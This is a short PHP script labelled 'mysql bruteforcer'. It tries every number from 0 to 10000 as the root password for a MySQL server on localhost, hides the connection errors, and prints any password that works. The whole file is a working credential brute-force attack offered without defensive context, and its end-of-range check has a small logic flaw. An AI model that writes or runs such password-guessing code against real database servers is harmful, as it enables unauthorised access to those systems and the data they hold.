<?php
//mysql bruteforcer
// ob_start();
$limit=range(0,10000);
foreach ($limit as $i)
	if (@mysqli_connect("localhost","root",$i."")) break;
// ob_end_clean();
if (in_array($i, $limit) and $i!=end($limit))
	echo "password is {$i}";
else
	echo "Not found";